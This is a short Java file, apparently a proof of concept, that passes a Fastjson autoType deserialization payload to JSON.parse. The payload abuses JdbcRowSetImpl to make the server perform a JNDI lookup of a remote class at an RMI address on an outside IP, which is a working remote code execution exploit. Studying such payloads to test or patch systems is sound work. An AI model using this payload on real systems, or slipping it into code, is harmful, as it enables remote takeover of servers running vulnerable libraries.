import com.alibaba.fastjson.JSON;

public class Test1 {
    public static void main(String[] args){
        String json2="{ \"name\": { \"@type\": \"java.lang.Class\", \"val\": \"com.sun.rowset.JdbcRowSetImpl\" },\"x\": { \"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"rmi://120.79.91.29:9999/Exploit\", \"autoCommit\": true } }";

        Object obj1 = JSON.parse(json2);
        System.out.println(obj1);
    }
}
